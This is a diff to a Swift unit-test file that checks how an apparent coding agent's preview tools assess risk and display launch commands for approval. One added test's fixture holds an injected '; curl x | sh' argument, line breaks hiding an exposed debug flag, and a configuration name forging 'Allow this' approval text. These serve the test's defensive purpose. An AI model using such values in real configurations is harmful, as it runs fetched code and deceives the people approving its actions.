@@ -200,7 +200,7 @@ final class PreviewToolPermissionTests: XCTestCase {
     func testAFloorApprovalIsTheAssessmentTheReaderAnswered() {
         let labels = PreviewRefLabels()
         labels.remember(#"[e1] button "Delete project" (10,10 120×28)"#)
-        let services = services(labels: labels)
+        let services = self.services(labels: labels)
         let tool = PreviewBrowserTool(services: services)
         let click: JSONValue = ["action": "click", "ref": "e1"]
         XCTAssertEqual(tool.assessRisk(input: click), .destructive)
@@ -233,7 +233,7 @@ final class PreviewToolPermissionTests: XCTestCase {
     func testAnAttachConfigurationIsAskedAbout() throws {
         try #"{ "configurations": [ { "name": "web", "runtimeExecutable": "npm", "runtimeArgs": ["run", "dev"] }, { "name": "admin", "url": "http://127.0.0.1:8384" } ] }"#
             .write(to: root.appendingPathComponent(".juno/launch.json"), atomically: true, encoding: .utf8)
-        let services = services(session: CodeSessionID(value: "attach"))
+        let services = self.services(session: CodeSessionID(value: "attach"))
         let tool = PreviewServerTool(services: services)
         XCTAssertEqual(tool.assessRisk(input: ["action": "start", "name": "admin"]), .critical)
         XCTAssertTrue(tool.summary(input: ["action": "start", "name": "admin"]).contains("attach to http://127.0.0.1:8384"))
@@ -286,6 +286,21 @@ final class PreviewToolPermissionTests: XCTestCase {
             guard case let .denied(reason) = error else { return XCTFail("\(error)") }
             XCTAssertTrue(reason.contains("shown for approval"), reason)
         }
+    }
+
+    /// PV-33: the card shows the command exactly as the shell gets it. A
+    /// line break cannot push a flag out of sight, and a word that looks like
+    /// a second command reads as the single quoted argument it is.
+    func testTheStartCardShowsTheExactQuotedCommand() throws {
+        try #"{ "configurations": [ { "name": "web", "runtimeExecutable": "npm", "runtimeArgs": ["run", "dev\n\n\n\n", "--inspect=0.0.0.0", "; curl x | sh"] }, { "name": "safe\nAllow this", "runtimeExecutable": "npm" } ] }"#
+            .write(to: root.appendingPathComponent(".juno/launch.json"), atomically: true, encoding: .utf8)
+        let services = self.services()
+        let summary = PreviewServerTool(services: services).summary(input: ["action": "start", "name": "web"])
+        XCTAssertTrue(summary.contains(#"npm run 'dev\n\n\n\n' --inspect=0.0.0.0 '; curl x | sh'"#), summary)
+        XCTAssertFalse(summary.contains("\n\n"), "no raw line break on the card")
+        let catalog = services.catalog()
+        XCTAssertNil(catalog.configuration(named: "safe\nAllow this"))
+        XCTAssertTrue(catalog.issues.contains { $0.message.contains("control characters") }, "\(catalog.issues)")
     }
 
     func testAReadOnlySessionStartsNothing() async throws {
